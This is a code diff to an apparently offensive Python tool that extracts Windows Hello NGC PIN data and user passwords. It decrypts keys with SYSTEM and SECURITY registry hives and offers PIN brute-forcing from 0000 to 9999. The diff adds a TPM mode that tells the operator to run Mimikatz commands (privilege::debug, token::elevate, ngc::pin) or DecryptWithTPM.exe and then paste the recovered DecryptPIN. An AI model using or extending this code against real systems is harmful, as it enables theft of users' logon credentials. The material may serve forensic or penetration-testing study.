@@ -99,6 +99,7 @@ if __name__ == '__main__':
     parser.add_option('--pinbrute', metavar='BOOL', dest='pinbrute', action="store_true", help='... or brute force PIN 0000 to 9999')
     parser.add_option('--registry', metavar='BOOL', dest='registry', action="store_true", help='Use SOFTWARE registry instead of Vault to extract password')
     parser.add_option('--live', metavar='BOOL', dest='live', action="store_true", help='Required for a live run to dump Registry Hives, run as SYSTEM')
+    parser.add_option('--tpm', metavar='BOOL', dest='tpm', action="store_true", help='Will tell you what to do with TPM systems')
     
     (options, args) = parser.parse_args()
     check_parameters(options, args)
@@ -133,11 +134,13 @@ if __name__ == '__main__':
     ## STEP1b: I know, only working with the last of the NGC Files here, TODO: adjust in case multiple accounts have a PIN
     sUserSID = arrNGCData[1]
     bRSAData1 = b''
-    sGUID1 = ''
+    sGUID1 = arrNGCData[0]
     for arrProtector in arrProtectors:
         if arrProtector[1] == 'Microsoft Software Key Storage Provider': 
             sGUID1 = arrProtector[2]
             bRSAData1 = arrProtector[4]
+        elif arrProtector[1] == 'Microsoft Platform Crypto Provider':
+            boolTPM = True
     for arrItem in arrItems:
         if arrItem[1] == '//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F': sGUID2 = arrItem[3]
     
@@ -165,23 +168,28 @@ if __name__ == '__main__':
     print('[+] Working on : ' + sUsername + ' (' + sUserSID + ')')
     
     ## STEP3a: Get decrypted RSA Keys for first GUID from Crypto Folder
-    print('[!] Decrypting crypto keys, this might take a while')
     import ngccryptokeysdec
-    if options.pinbrute: 
-        sPIN = ''
-        print('     PIN Bruteforce selected, this will take even longer ;-)')
-    else: sPIN = options.pin
-    try: 
-        sRSAKEY1 = ngccryptokeysdec.main(sCryptoFolder, sSystemMasterKeyFolder, sSYSTEMHive, sSECURITYHive, sPIN, sGUID1, False).hex()
-    except: 
-        exit('[-] Error: PIN wrong or key in TPM?')
-    oRSAKEY1 = constructRSAKEY(sRSAKEY1)
-    oCipher1 = PKCS1_v1_5.new(oRSAKEY1)
+    if not options.tpm:
+        print('[!] Decrypting crypto keys, this might take a while')
+        if options.pinbrute: 
+            sPIN = ''
+            print('     PIN Bruteforce selected, this will take even longer ;-)')
+        else: sPIN = options.pin
+        try: sRSAKEY1 = ngccryptokeysdec.main(sCryptoFolder, sSystemMasterKeyFolder, sSYSTEMHive, sSECURITYHive, sPIN, sGUID1, False).hex()
+        except: exit('[-] Error: PIN wrong or key in TPM? In case of TPM rerun with --tpm')
+        oRSAKEY1 = constructRSAKEY(sRSAKEY1)
+        oCipher1 = PKCS1_v1_5.new(oRSAKEY1)
     
-    ## STEP3b: Use RSA KEY to decrypt the NGC Input Data
-    try: bDecrRSAData1 = oCipher1.decrypt(bRSAData1, b'')
-    except: exit('[-] Error decrypting the inputdata')
-    sDecryptPin = parseDecryptPin(bDecrRSAData1).hex() ## Add "verbose=True" to get Decr PIN, Sign PIN and Unk PIN
+    ## STEP3b: Use RSA KEY to decrypt the NGC Input Data (or ask for the Decryption key)
+    if options.tpm:
+        print('[!] TPM option selected, let\'s get the DecryptPIN from TPM, this requires live access to run')
+        print('     Mimikatz; privilege::debug, token::elevate, ngc::pin /pin:<THEPIN> /guid:{}'.format(sGUID1))
+        print('     Or use DecryptWithTPM.exe {} <THEPIN>'.format(sGUID1))
+        sDecryptPin = input('[?] Please copy paste just the "DECRYPTPIN" : ')
+    else:
+        try: bDecrRSAData1 = oCipher1.decrypt(bRSAData1, b'')
+        except: exit('[-] Error decrypting the inputdata')
+        sDecryptPin = parseDecryptPin(bDecrRSAData1).hex() ## Add "verbose=True" to get Decr PIN, Sign PIN and Unk PIN
     print('[!] Trying to decrypt user password')
     
     ## STEP4a: Get decrypted RSA Keys for second GUID from Crypto Folder
